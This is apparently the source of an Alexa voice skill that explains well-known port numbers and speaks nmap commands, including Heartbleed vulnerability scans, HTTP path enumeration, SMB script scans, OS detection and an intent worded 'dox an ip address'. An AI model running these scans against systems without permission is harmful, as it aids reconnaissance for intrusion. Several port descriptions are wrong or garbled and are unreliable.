'use strict';

const Alexa = require('alexa-sdk');

//var Data = require("./data");

const ports = { "PORTS_EN_US" : {
    // well known ports
	"0" : "Port 0 is reserved but if in use by an API will return a dynamically allocated port.",
    "1" : "Port 1 is TCP and UDP are reserved for Port Service Multiplexer or TCP MUX",
    "2" : "Port 2 is unknown.",
    "3" : "Port 3 is unknown or unassigned.",
	"4" : "Port 4 is unassigned",
	"5" : "Port 5 is remote job entry.",
	"6" : "Port 6 is unassigned.",
	"7" : "Port 7 is echo protocol.",
	"8" : "Port 8 is unsssigned.",
    "9" : "Port 9 is Wake on LAN",
    "10" : "Port 10 is unassigned.",
    "11" : "Port 11 TCP and UDP is Active Users or systat service.",
	"12" : "Port 12 is unassigned.",
	"13" : "Port 13 is daytime protocol.",
	"14" : "Port 14 is unassigned.",
	"15" : "Port 15 was formerly netstat service.",
	"16" : "Port 16 is unassigned.",
	"17" : "Port 17 is Quote of the Day.",
	"18" : "Port 18 is Message Send Protocol.",
	"19" : "Port 19 is Character Generator Protocol.",
	"20" : "Port 20 is File Transfer Protocol data transfer.",
	"21" : "Port 21 is File Transfer Protocol control and command.",
	"22" : "Port 22 is Secure Shell, Secure Copy or Secure File Transfer Protocol.",
	"23" : "Port 23 is Telnet.",
	"25" : "Port 25 is Simple Mail Transfer Protocol or SMTP.",
	"26" : "Port 26 is unassigned.",
	"37" : "Port 37 is Time Protocol.",
	"38" : "Port 38 is Route Access Protocol.",
	"39" : "Port 39 is Resource Location Protocol.",
	"40" : "Port 40 is unassigned.",
	"42" : "Port 42 is Host Name Server Protocol.",
	"43" : "Port 43 is WHOIS protocol.",
	"47" : "Port 47 is unknown.",
    "48" : "Port 48 is unknown.",
	"49" : "Port 49 is Terminal Access Controller Access-Control System plus login host protocol.",
    "50" : "Port 50 is used by Remote Mail Checking Protocol.",
    "51" : "Port 51 is reserved but 51 TCP had been previously used by Interface Message Processor.",
    "52" : "Port 52 is Xerox Network Systems Time Protcol.",
    "53" : "Port 53 is Domain Name System or DNS.",
	"54" : "Port 54 is Xerox Network Systems clearinghouse.",
	"56" : "Port 56 is Xerox Network Systems authentication.",
	"57" : "Port 57 is any private terminal access, Mail Transfer Protocol or FX-Tools Vulnerability Scanner.",
	"58" : "Port 58 is Xerox Network Systems Mail.",
	"67" : "Port 67 is assigned to Bootstrap Protocol or BOOT-P it is also used by DHCP.",
	"68" : "Port 68 is assigned to Bootstrap Protocol or BOOT-P it is also used by DHCP.",
	"69" : "Port 69 is Trivial File Transfer Protocol.",
	"70" : "Port 70 is Gopher protocol.",
	"71" : "Port 71 is NET RJS protocol.",
	"72" : "Port 72 is NET RJS protocol.",
	"73" : "Port 73 is NET RJS protocol.",
	"74" : "Port 74 is NET RJS protocol.",
	"75" : "Port 75 is Any private dial out service.",
	"77" : "Port 77 is Any private Remote job entry.",
	"79" : "Port 79 is Finger protocol.",
	"80" : "Port 80 is HTTP or QUIC which is the Google implementation of HTTP version 2.",
	"81" : "Port 81 is Tor Park onion routing.",
	"82" : "Port 82 is Tor Park control.",
	"87" : "Port 87 is any private terminal link.",
	"88" : "Port 88 is Kerberos authentication.",
	"90" : "Port 90 is DOD Network Security for Information Exchange or Secur it Attribute Token Map or Point Cast.",
	"99" : "Port 99 is WIP message protocol.",
	"100" : "Port 48 is unassigned.",
    "101" : "Port 101 TCP and UDP are used by NIC host name.",
    "102" : "Port 102 is used by ISO Transport Service Access Point or TASP.",
    "103" : "Port 103 is not reserved.",
    "104" : "Port 104 is used by DICOM or medical digital imaging.",
    "105" : "Port 105 is used by CCSO nameserver",
	"107" : "Port 107 is Remote User Telnet Service.",
	"108" : "Port 108 is IBM Systems Network Architecture SNA gateway access server.",
	"109" : "Port 109 is Post Office Protocol 2.",
	"110" : "Port 110 is Post Office Protocol 3.",
	"111" : "Port 111 is Open Network Computing Remote Procedure Call, ONC RPC or Sun RPC.",
	"112" : "Port 112 is Virtual Router Redundancy Protocol or VRRP.",
	"113" : "Port 113 is Ident authentication service used by IRC servers for user authentication.",
	"114" : "Port 114 is unassigned since June 2004.",
	"115" : "Port 115 is Simple File Transfer Protcol.",
	"117" : "Port 117 is U-UCP Mapping Project or path service.",
	"118" : "Port 118 is Structure Query Lanaguage.",
	"119" : "Port 119 is Network News Transfer Protocol.",
	"123" : "Port 123 is Network Time Protocol.",
	"126" : "Port 126 is NX-Edit for Unisys.",
	"135" : "Port 135 is D.C.E endpoint resolution or Microsoft End Point Mapper which is also known as R.P.C Locator Service. Port 135 is also associated with D.H.C.P. and D.N.S. and is also used by D.C.O.M.",
	"137" : "Port 137 is Net BIOS Name Service for registration and resolution.",
	"138" : "Port 138 is Net BIOS Datagram Service.",
	"139" : "Port 139 is Net BIOS Session Service.",
	"143" : "Port 143 is Internet Message Access Protocol or IMAP for e-mail.",
	"152" : "Port 152 is Background File Transfer Program.",
	"153" : "Port 153 is Simple Gateway Monitoring Protocol.",
    "156" : "Port 156 is Structured Query Language.",
	"158" : "Port 158 is Distributed Mail System Protocol.",
	"161" : "Port 161 is Simple Network Management Protocol.",
	"162" : "Port 162 is Simple Network Management Protcol Trap.",
	"170" : "Port 170 is Print Server.",
	"177" : "Port 177 is X Display Manager Control Protocol.",
	"179" : "Port 179 is Border Gateway Protocol.",
	"194" : "Port 194 is Internet Relay Chat.",
	"199" : "Port 199 is SNMP multiplexing protocol.",
	"201" : "Port 201 is Apple Talk Routing Maintenance.",
	"209" : "Port 209 is Quick Mail Transfer Protcol.",
	"210" : "Port 210 is ANSI, Z39.50.",
	"213" : "Port 213 is Internetwork Packet Exchange.",
	"218" : "Port 218 is Message posting protocol.",
	"220" : "Port 220 is Internet Message Access Protocol V3.",
	"259" : "Port 259 is Efficient Short Remote Operations.",
	"262" : "Port 262 is Arcis-dms.",
	"264" : "Port 264 is Border Gateway Multicast Protocol.",
	"280" : "Port 280 is HTTP-management.",
	"300" : "Port 300 TCP is ThinLinc Web Access.",
	"308" : "Port 308 TCP is Novastor Online Backup.",
	"311" : "Port 311 TCP is Mac OS X Server Admin or AppleShare.",
	"318" : "Port 318 is P.K.I.X. Time Stamp Protocol.",
	"319" : "Port 319 UDP is Precision Time Protocol event messages.",
	"320" : "Port 320 UDP is Precision Time Protocol general messages.",
	"350" : "Port 350 is Mapping of Airline Traffic over Internet Protocol type A.",
	"351" : "Port 351 is Mapping of Airline Traffic over Internet Protocol type B.",
	"356" : "Port 356 is Cloanto Amiga Explorer.",
	"366" : "Port 366 is On Demand Mail Relay.",
	"369" : "Port 369 is RPC 2 Portmap.",
	"370" : "Port 370 TCP or UPD is Coda authentication server. Port 370 UDP may also be SecureCast 1.",
	"371" : "Port 371 UPD is Clear Case.",
	"383" : "Port 383 is HP data alarm manager.",
	"384" : "Port 384 is A Remote Network Server System.",
	"387" : "Port 387 is Apple Talk Update-based Routing Protocol.",
	"389" : "Port 389 is Lightweight Directory Access Protocol.",
	"399" : "Port 399 is Digital Equipment Corporation phase V plus.",
	"401" : "Port 401 is Uninterruptable power supply.",
	"427" : "Port 427 is Service Location Protocol.",
	"433" : "Port 433 is Network News Transfer Protocol or NNSP.",
	"434" : "Port 434 is Mobile IP Agent.",
	"443" : "Port 443 TCP or UDP is HTTPS. Port 443 UDP may also be QUIC.",
	"444" : "Port 444 is Simple Network Paging Protocol. Over TCP, port 444 may also be Slither.IO.",
	"445" : "Port 445 TCP is Microsoft Active Directory or SMB.",
	"464" : "Port 464 is Kerberos change password.",
	"465" : "Port 465 TCP is URL Rendezvous Directory or authenticated Simple Mail Transport Protocol Secure.",
	"475" : "Port 475 is Aladdin Knowledge Systems.",
	"491" : "Port 491 TCP is Go Global remote access.",
	"497" : "Port 497 TCP is Dantz Retrospect.",
	"500" : "Port 500 is Internet Securty Association and Key Management Protocol or Internet Key Exchange.",
	"502" : "Port 502 is Modbus Protocol.",
	"504" : "Port 504 is Citadel multi-service protcol for clients.",
	"510" : "Port 510 is First Class Protocol.",
	"512" : "Port 512 TCP is Remote Process Execution. Port 512 UDP is Comsat with Biff",
	"513" : "Port 513 TCP is Who.",
	"514" : "Port 514 TCP is Remote Shell. Port 514 UDP is Syslog.",
	"515" : "Port 515 is Line Printer Daemon print service.",
	"517" : "Port 517 UDP is Talk.",
	"518" : "Port 518 UDP is N-Talk.",
	"520" : "Port 520 TCP is Extended Filename Server. Port 520 UDP Routing Information Protocol.",
	"521" : "Port 521 UDP is Routing Information Protocol Next Generation.",
	"524" : "Port 524 is Netware Core Protocol.",
	"525" : "Port 525 is Timed or Timeserver.",
	"530" : "Port 530 is Remote Procedure Call.",
	"531" : "Port 531 is AOL Instant Messenger.",
	"532" : "Port 532 is Net News.",
	"533" : "Port 533 UDP is Netwall or For Emergency Broadcasts.",
	"540" : "Port 540 TCP is Unix-to-Unix Copy Protocol.",
	"542" : "Port 542 is Commerce Applications.",
	"543" : "Port 543 TCP is Kerberos Login.",
	"544" : "Port 544 TCP is Kerberos Remote Shell.",
	"545" : "Port 545 TCP is OSI soft PI Server Client Access.",
	"546" : "Port 546 is DHCP v6 client.",
	"547" : "Port 547 is DHCP v6 server.",
	"548" : "Port 548 TCP Apple Filling Protocol.",
	"550" : "Port 550 is new-who.",
	"560" : "Port 560 UDP is Remote Monitor.",
	"561" : "Port 561 UDP is monitor.",
	"563" : "Port 563 is NNTP over TLS.",
	"564" : "Port 564 is Plan 9.",
	"585" : "Port 585 TCP is legacy use of Internet Message Access Protocol Secure.",
	"587" : "Port 587 is email message submission. SMTP.",
	"591" : "Port 591 is FileMaker Web Sharing HTTP Alternate.",
	"593" : "Port 593 is HTTP RPC or Remote Procedure Call over HTTP.",
	"601" : "Port 601 TCP is Reliable Syslog used for system logging.",
	"604" : "Port 604 TCP is TUNNEL profile.",
	"623" : "Port 623 UDP is ASF Remote Management and Control Protocol.",
	"625" : "Port 625 TCP is Open Directory Proxy.",
	"631" : "Port 631 is Internet Printing Protocol or Common Unix Printing System.",
	"635" : "Port 635 is RLZ. D-Base.",
	"636" : "Port 636 is Lightweight Directory Access Protocol S.",
	"639" : "Port 639 is Multicast Source Discovery Protocol.",
	"641" : "Port 641 is SupportSoft Nexus Remote Command.",
	"643" : "Port 643 is SAN-ity.",
	"646" : "Port 646 is Label Distribution Protocol.",
	"647" : "Port 647 TCP is DHCP failover protocol.",
	"648" : "Port 648 TCP is Registry Registrar Protocol.",
	"651" : "Port 651 is IEEE MMS.",
	"653" : "Port 653 is SupportSoft Nexus Remote Command or a proxy gateway.",
	"654" : "Port 654 TCP is Media Management System or Media Management Protocol.",
	"655" : "Port 655 is T-inc VPN daemon.",
	"657" : "Port 657 is IBM Remote Monitoring and Control Protocol or Hardware Management Console.",
	"660" : "Port 660 is Mac OS X Server administration.",
	"666" : "Port 666 is Doom, first person shooter and port 666 UDP is also used by air-serv-NG and air-crack-NG servers for remote wireless control of devices.",
	"674" : "Port 674 TCP is Application Configuration Access Protocol.",
    "688" : "Port 688 TCP or UDP is REALM-RUSD ApplianceWare server appliance management protocol. ",
    "690" : "Port 690 TCP or UDP is Veneo Application Transfer Protocol or VATP.",
    "691" : "Port 691 TCP is Microsoft Exchange Routing.",
    "694" : "Port 694 TCP or UDP is Linux-HA or high-availability heartbeat.",
    "695" : "Port 695 TCP is IEEE Media Management System over SSL",
    "698" : "Port 698 TCP is Optimized Link State Routing or OLSR.",
    "700" : "Port 700 TCP is Extensible Provisioning Protocol or EPP. It is domain related communication between registrants and registrars.",
    "701" : "Port 701 TCP is Link Management Protocol or LMP.",
    "702" : "Port 702 TCP is Internet Registry Information Service or IRIS.",
    "706" : "Port 706 TCP is Secure Internet Live Conference or SILC.",
    "711" : "Port 711 TCP is Cisco Tag Distribution Protocol.",
    "712" : "Port 712 TCP is Topology Broadcast based on Reverse Path Forwarding routing protocol or TBRPF.",
    "749" : "Port 749 TCP  or UDP is Kerberos administration.",
    "750" : "Port 750 UDP is Kerberos version 4.",
    "751" : "Port 751 TCP or UDP is Kerberos authentication.",
    "752" : "Port 752 UDP is Kerberose password server.",
    "753" : "Port 753 TCP or UDP is Reverse Routing Header or RRH and port 753 also may host Kerberos user-reg server.",
    "754" : "Port 754 TCP or UDP is tell send or port 754 TCP may also host Kerberos 5 slave propagation.",
    "760" : "Port 760 TCP or UDP is Kerberos registration.",
    "782" : "Port 782 TCP is Conserver serial console management server.",
    "783" : "Port 783 TCP is Spam Assassin or spamd daemon.",
    "800" : "Port 800 TCP or UDP is MDBS-daemon.",
    "808" : "Port 808 TCP is Microsoft dot-Net TCP Port Sharing Service.",
    "829" : "Port 829 TCP is Certificate Management Protocol.",
    "830" : "Port 830 TCP and UDP is NETCONF over SSH.",
    "831" : "Port 831 TCP or UDP is NETCONF over BEEP.",
    "832" : "Port 832 TCP or UDP is NETCONF for SOAP over HTTPS.",
    "843" : "Port 843 TCP is Adobe Flash.",
    "847" : "Port 847 TCP is DHCP Failover Protocol.",
    "848" : "Port 848 TCP or UDP is Group Domain of Interpretation or G.D.O.I. protocol.",
    "853" : "Port 853 TCP or UDP is DNS over TLS.",
    "860" : "Port 860 TCP is iSCSI",
    "861" : "Port 861 TCP or UDP is OWAMP control.",
    "862" : "Port 862 TCP or UDP is TWAMP control. ",
    "873" : "Port 873 TCP is RSYNC file synchronization protocol.",
    "888" : "Port 888 TCP is CD Data Base protocol or it may be IBM Endpoint Manager Remote Control.",
    "897" : "Port 897 TCP or UDP is Brocade SMI-S RPC.",
    "898" : "Port 898 TCP or UDP is Brocade SMI-S RPC SSL.",
    "902" : "Port 902 TCP or UDP is VMware ESXi",
    "903" : "Port 903 TCP is VMware ESX-i",
    "914" : "Port 914 TCP is Unassigned.",
    "944" : "Port 944 UDP is Network File System service.",    
    "953" : "Port 953 TCP is BIND remote.",
    "981" : "Port 981 TCP is Remote HTTPS management for Check Point VPN 1.",
    "987" : "Port 987 TCP is Microsoft Windows SBS SharePoint.",
    "989" : "Port 989 TCP or UDP is FTPS Protocol for data or FTP over TLS.",    
    "990" : "Port 990 TCP or UDP is FTPS protocol for control or FTP over TLS.",    
    "991" : "Port 991 TCP or UDP is Net News Administration System or N.A.S.",
    "992" : "Port 992 TCP is UDP is Telnet protocol over TLS.",
    "993" : "Port 993 TCP is Internet Message Access Protocol over TLS. Otherwise known as I-MAPS",
    "994" : "Port 994 TCP or UDP is IRC over TLS.",
    "995" : "Port 995 TCP Post Office Protocol 3 or POPS-3 over TLS.",    
    "999" : "Port 999 TCP Sciamore-DB Database System.",
    "1010" : "Port 1010 TCP is ThinLinc web-based admin interface.",
    "1023" : "Port 1023 TCP or UDP is Reserved.",
	// Registered ports or turn up a port query server for this function...
    "1024" : "Port 1024 is reserved.",
    "1025" : "Port 1025 TCP is reserved.",
    "1027" : "Port 1027 UDP is Native IP-v6 behind IP-v4-to-IP-v4 NAT.",
    "1028" : "Port 1028 is deprecated.",
    "2949" : "Port is WAP push secure multimedia messaging service.",
    "9001" : "Port 9001 TCP is used for Share Point, or Cisco router configuration, or Tor, or DBG proxy, or H SQL DB, and port 9001 TCP and UDP is used by ETL Service Manager",
    "9150" : "Port 9150 is Tor.",
    "11001" : "Port 11 001 TCP and UDP is used by meta sys or Johnson Controls Metasys java AC controls",
    "25565" : "Port 25 5 65 TCP is used by My SQL and also by MineCraft",
    "49151" : "Port 49 1 51 TCP and UDP is reserved.",
    "43594" : "Port 43 5 94 through 43 5 49 TCP and UDP is RuneScape."
} };

const nmap = { "NMAP_EN_US" : {
	"normal": {"speech" : "nmap 192.168.1.1", "card" : "nmap 192.168.1.1"},
	"find information on an ip address": {"speech" : "at the command prompt, enter n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24. You should replace the 192 address with the address you are searching for.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	"find ip information": {"speech" : "at the command prompt, enter n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24. You should replace the 192 address with the address you are searching for.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	"find information about an ip address": {"speech" : "at the command prompt, enter n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24. You should replace the 192 address with the address you are searching for.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	"lookup an ip address": {"speech" : "at the command prompt, enter n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24. You should replace the 192 address with the address you are searching for.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	"dox an ip address": {"speech" : "at the command prompt, enter n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24. You should replace the 192 address with the address you are searching for.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	// heart bleed
	"check for heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"test for heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"scan for heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"detect heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  n map dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"find heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"look for heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},	
	// get HTTP page titles
	"get page titles from http": {"speech" : "at the command prompt, enter n map space dash dash script=http dash title space 192.168.1.0 forward slash 24", "card" : "nmap --script=http-title 192.168.1.0/24"},
	"get http data": {"speech" : "at the command prompt, enter n map space dash dash script=http dash title space 192.168.1.0 forward slash 24", "card" : "nmap --script=http-title 192.168.1.0/24"},
	"scan for http": {"speech" : "at the command prompt, enter n map space dash dash script=http dash title space 192.168.1.0 forward slash 24", "card" : "nmap --script=http-title 192.168.1.0/24"},
	"scan for http data": {"speech" : "at the command prompt, enter n map space dash dash script=http dash title space 192.168.1.0 forward slash 24", "card" : "nmap --script=http-title 192.168.1.0/24"},
	// http header scan
	"get http headers": {"speech" : "at the command prompt, enter n map space dash dash script=http dash headers 192.168.1.0 forward slash 24", "card" : "nmap --script=http-headers 192.168.1.0/24"},
	"get web headers": {"speech" : "at the command prompt, enter n map space dash dash script=http dash headers 192.168.1.0 forward slash 24", "card" : "nmap --script=http-headers 192.168.1.0/24"},
	"return http headers": {"speech" : "at the command prompt, enter n map space dash dash script=http dash headers 192.168.1.0 forward slash 24", "card" : "nmap --script=http-headers 192.168.1.0/24"},
	"enumerate web app paths": {"speech" : "at the command prompt, enter n map space dash dash script=http dash enum 192.168.1.0 forward slash 24", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	// http path scan
	"list web app paths": {"speech" : "at the command prompt, enter n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	"show web app paths": {"speech" : "at the command prompt, enter n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	"find web app paths": {"speech" : "at the command prompt, enter n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	"find web site paths": {"speech" : "at the command prompt, enter n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	"show web site paths": {"speech" : "at the command prompt, enter n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24", "card" : "nmap --script=http-enum 192.168.1.0/24"},
// list NSE scripts
	"find out what nse scripts are installed": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"find out what n. s. e. scripts are installed": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"find out which nse scripts are installed": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"find out which n. s. e. scripts are installed": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"find which nse scripts are installed": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"find which n. s. e. scripts are installed": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"find installed nse scripts": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"find installed n. s. e. scripts": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"nse scripts": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"n. s. e. scripts": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"list installed scripts": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"list nse scripts": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	"list n. s. e. scripts": {"speech" : "locate space nse space pipe space grep space script", "card" : "locate nse | grep script"},
	// save scan
	"scan using safe scripts": {"speech" : "nmap space dash s upper-case V dash s upper-case C space 192.168.1.1", "card" : "nmap -sV -sC 192.168.1.1"},
	"do a scan using safe scripts": {"speech" : "nmap space dash s upper-case V dash s upper-case C space 192.168.1.1", "card" : "nmap -sV -sC 192.168.1.1"},
	"use safe scripts": {"speech" : "nmap space dash s upper-case V dash s upper-case C space 192.168.1.1", "card" : "nmap -sV -sC 192.168.1.1"},
	"do a safe scan": {"speech" : "nmap space dash s upper-case V dash s upper-case C space 192.168.1.1", "card" : "nmap -sV -sC 192.168.1.1"},
	"safe scan": {"speech" : "nmap space dash s upper-case V dash s upper-case C space 192.168.1.1", "card" : "nmap -sV -sC 192.168.1.1"},
	"do a scan without crashing anything": {"speech" : "nmap space dash s upper-case V dash s upper-case C space 192.168.1.1", "card" : "nmap -sV -sC 192.168.1.1"},
	"do a scan without crashing servers": {"speech" : "nmap space dash s upper-case V dash s upper-case C space 192.168.1.1", "card" : "nmap -sV -sC 192.168.1.1"},
// get help
	"get help for a script": {"speech" : "If you wanted help for the heart bleed script you would enter nmap dash dash script dash help equal sign ssl-heartbleed", "card" : "nmap --script-help=ssl-heartbleed"},
	"get help on a script": {"speech" : "If you wanted help for the heart bleed script you would enter nmap dash dash script dash help equal sign ssl-heartbleed", "card" : "nmap --script-help=ssl-heartbleed"},
	"get help": {"speech" : "If you wanted help for the heart bleed script you would enter nmap dash dash script dash help equal sign ssl-heartbleed", "card" : "nmap --script-help=ssl-heartbleed"},
	// nse scripts
	"scan using an nse script": {"speech" : "The command line for using a script is complex. Please refer to the Alex app output for the syntax.", "card" : "nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1"},
	"scan with a nse script": {"speech" : "The command line for using a script is complex. Please refer to the Alex app output for the syntax.", "card" : "nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1"},
	"scan with a script": {"speech" : "The command line for using a script is complex. Please refer to the Alex app output for the syntax.", "card" : "nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1"},
// scan with a set of scripts
	"scan with a set of scripts": {"speech" : "n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"scan with related scripts": {"speech" : "n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use a set of scripts": {"speech" : "n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use a set of n. s. e. scripts": {"speech" : "n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use a set of nse scripts": {"speech" : "n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use related scripts": {"speech" : "n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use related nse scripts": {"speech" : "n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use related n. s. e. scripts": {"speech" : "n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1", "card" : "nmap -sV --script=smb* 192.168.1.1"},
// save
	"save output to a file": {"speech" : "n map space dash o upper-case N space outputfile.txt space 192.168.1.1", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan output to a file": {"speech" : "n map space dash o upper-case N space outputfile.txt space 192.168.1.1", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan to a file": {"speech" : "n map space dash o upper-case N space outputfile.txt space 192.168.1.1", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan detail to a file": {"speech" : "n map space dash o upper-case N space outputfile.txt space 192.168.1.1", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save results to a file": {"speech" : "n map space dash o upper-case N space outputfile.txt space 192.168.1.1", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save data to a file": {"speech" : "n map space dash o upper-case N space outputfile.txt space 192.168.1.1", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan detail": {"speech" : "n map space dash o upper-case N space outputfile.txt space 192.168.1.1", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan output": {"speech" : "n map space dash o upper-case N space outputfile.txt space 192.168.1.1", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save a scan to a file": {"speech" : "n map space dash o upper-case N space outputfile.txt space 192.168.1.1", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
// save to greppable file
	"save output to a greppable file": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan output to a greppable file": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan to a greppable file": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan detail to a greppable file": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save results to a greppable file": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save data to a greppable file": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan detail in grep format": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan output in grep format": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save a scan to a greppable file": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save results for grepping": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan results for grep": {"speech" : "n map space dash o upper-case G space outputfile.txt space 192.168.1.1", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
// xml
	"save results to xml": {"speech" : " n map space dash o upper-case X space outfile.xml space 192.168.1.1", "card" : "nmap -oX outputfile.xml 192.168.1.1"},
	"save results in all formats": {"speech" : "n map space dash o upper-case A space outfile.xml space 192.168.1.1", "card" : "nmap -oA outputfile 192.168.1.1"},
	"save scan results to xml": {"speech" : "n map space dash o upper-case X space outfile.xml space 192.168.1.1", "card" : "nmap -oX outputfile.xml 192.168.1.1"},
	"save scan results in all formats": {"speech" : "n map space dash o upper-case A space outfile.xml space 192.168.1.1", "card" : "nmap -oA outputfile 192.168.1.1"},
	// detect OS fingerprint
	"detect operating system and services": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
	"detect operating system": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
	"detect OS and services": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
